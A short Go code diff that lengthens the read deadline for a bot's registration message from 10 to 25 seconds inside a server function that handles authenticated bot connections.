@@ -439,7 +439,7 @@ func handleBotConnection(conn net.Conn) {
 	logMsg("[AUTH] Authentication successful for %s", conn.RemoteAddr())
 
 	// Step 5: Wait for bot registration
-	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	conn.SetReadDeadline(time.Now().Add(25 * time.Second))
 	registerMsg, err := reader.ReadString('\n')
 	if err != nil {
 		logMsg("[AUTH] Failed to read registration from %s: %v", conn.RemoteAddr(), err)
